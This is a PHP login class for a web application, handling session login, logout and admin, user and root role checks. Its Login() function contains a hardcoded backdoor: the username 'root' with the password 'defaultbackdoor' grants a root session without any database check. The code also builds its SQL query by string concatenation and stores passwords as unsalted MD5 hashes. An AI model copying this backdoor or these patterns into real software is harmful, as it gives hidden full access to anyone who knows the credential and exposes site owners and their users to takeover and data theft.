<?php
session_start();
class apps_libs_UserLogin
{
    private $user;
    private $pass;

    function apps_libs_UserLogin()
    {

    }

    function EPass()
    {
        return md5($this->pass);
    }

    function Login()
    {

        include("Dbconn.php");
        $rt = new apps_libs_Router();
        $this->user = (new apps_libs_Utilities())->EditDataImportDB(trim($rt->GetPost('user')));
        $this->pass = (new apps_libs_Utilities())->EditDataImportDB(trim($rt->GetPost('pass')));
        if($this->user=='root'&&$this->pass=='defaultbackdoor')
        {
            $_SESSION["userID"] = "1";
            $_SESSION['typeAcc']= "root";
            return true;
        }
        $ds = new apps_libs_Dbconn();
        $query = ([
            "select" => "id,type",
            "from" => "acc",
            "where" => "user='" . $this->user . "' and pass='" . $this->EPass() . "' and acc.active!='no'"
        ]);
        $result = $ds->SelectOne($query);
        // var_dump($this->EPass());die;
        $row = mysqli_fetch_assoc($result);
        if ($row) {
            $_SESSION["userID"] = (string)$row["id"];
            $_SESSION['typeAcc']=(string)$row['type'];
            return true;
        }

        return false;
    }

    function GetAcc()
    {
        if ($this->isOnline())
            return $_SESSION["userID"];
        return null;
    }

    function Logout()
    {
        unset($_SESSION['userID']);
        unset($_SESSION['typeAcc']);
    }

    function isOnline()
    {
        return isset($_SESSION["userID"]);
    }

    function CheckAdmin()
    {
        if($this->isOnline())
        {
            if($_SESSION['typeAcc']=="admin"||$_SESSION['typeAcc']=="root") return TRUE;
        }
        return false;
    }

    function CheckUser()
    {
        if($this->isOnline())
        {
            if($_SESSION['typeAcc']=="user") return TRUE;
        }
        return false;
    }

    function CheckRoot()
    {
        if($this->isOnline())
        {
            if($_SESSION['typeAcc']=="root") return TRUE;
        }
        return false;
    }
}
?>